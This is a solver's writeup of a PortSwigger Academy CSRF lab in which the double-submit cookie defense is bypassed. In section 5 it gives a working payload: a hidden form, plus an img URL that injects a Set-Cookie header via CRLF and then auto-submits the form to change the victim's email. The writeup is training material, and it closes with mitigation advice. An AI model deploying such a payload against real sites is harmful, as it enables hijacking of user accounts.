# CSRF Where Token Is Duplicated in Cookie — Writeup

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Vulnerability:** Cross-Site Request Forgery (CSRF)  
**Status:** Solved ✅

## 1. Lab Description

This lab contains a CSRF vulnerability in the email change functionality. The application attempts to prevent CSRF attacks using the **Double-Submit Cookie** technique.

The goal is to exploit this weakness by hosting an HTML page on the exploit server that changes the victim's email address when they visit the page.

## 2. Initial Reconnaissance

I logged in using the provided credentials:

- **Username:** `wiener`
- **Password:** `peter`

I intercepted the email change request using Burp Suite and sent it to Repeater.

The request contained a `csrf` parameter in the POST body and a `csrf` cookie in the `Cookie` header.

Example:

```http
POST /my-account/change-email HTTP/2
Cookie: csrf=<csrf-token>; session=<session-cookie>
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=<csrf-token>
```

Both CSRF token values initially matched.

## 3. Testing the CSRF Validation

I performed several tests in Burp Repeater to understand how the application validated the token.

**Test 1 — Modified only the body token**

I changed the `csrf` parameter in the POST body while leaving the cookie unchanged.

**Result:** The server returned `400 Bad Request`.

**Test 2 — Removed both token values**

I removed the CSRF cookie and the body parameter.

**Result:** The server returned `400 Bad Request`.

**Test 3 — Changed both values to the same arbitrary string**

I changed the CSRF cookie and the body parameter to the same value:

```text
csrf=fateh123
```

**Result:** The server returned `302 Found`, and the email address was changed successfully.

This demonstrated that the application accepted matching attacker-chosen values instead of validating the token against a securely generated, session-bound secret.

## 4. Understanding the Vulnerability

The application uses the Double-Submit Cookie pattern. In a secure implementation, the server must ensure that an attacker cannot arbitrarily set a matching CSRF cookie and request parameter.

Here, the application only appeared to check whether the cookie value matched the submitted `csrf` parameter.

The exploit therefore required two steps:

1. Make the victim's browser store an attacker-controlled CSRF cookie.
2. Submit a cross-origin POST request containing the same CSRF value.

The exploit server can host an HTML page that performs both actions.

## 5. Exploit Payload

I created the following HTML payload on the PortSwigger exploit server:

```html
<form action="https://0a6d00bd0438833780e91224002e0083.web-security-academy.net/my-account/change-email"
      method="POST">
    <input type="hidden" name="email" value="fateh201@gmail.com">
    <input type="hidden" name="csrf" value="fateh123">
</form>

<img src="https://0a6d00bd0438833780e91224002e0083.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fateh123%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

### How the payload works

**Step 1 — Injecting the CSRF cookie**

The image URL contains a crafted request intended to inject a `Set-Cookie` response header through the vulnerable search functionality.

The injected cookie sets:

```http
Set-Cookie: csrf=fateh123; SameSite=None
```

This relies on the lab's vulnerable response-header handling.

**Step 2 — Triggering the form submission**

If the image fails to load, its `onerror` handler executes:

```javascript
document.forms[0].submit()
```

This submits the hidden form to the email change endpoint.

**Step 3 — Matching the CSRF values**

The form submits:

```text
csrf=fateh123
```

The browser also sends the injected CSRF cookie, provided the browser's cookie rules allow it to be sent.

Since both values match, the vulnerable validation accepts the request.

**Step 4 — Changing the email**

The server processes the request and changes the victim's email address.

## 6. Result

I hosted the payload on the exploit server and delivered it using the lab's exploit workflow.

**The lab was successfully solved.**

## 7. AI Assistance

I used AI assistance while constructing the payload, specifically for the `img src` portion responsible for triggering the cookie injection.

I independently inspected the original request, tested different token configurations in Burp Repeater, observed the server responses, identified the matching-token behavior, and verified the successful email change.

## 8. Key Takeaways

- A CSRF token appearing in both a cookie and a request parameter does not automatically make an application secure.
- The Double-Submit Cookie pattern is vulnerable if an attacker can inject or control the CSRF cookie.
- Burp Repeater is useful for testing how servers validate CSRF tokens.
- HTTP status codes can provide useful clues: in this lab, `400` indicated rejected requests, while `302` accompanied a successful email change.
- Cookie injection can be combined with an HTML form to exploit a CSRF vulnerability.
- A secure implementation should use a properly designed CSRF defense, such as a session-bound synchronizer token or a correctly implemented signed double-submit cookie, alongside appropriate cookie and origin protections.
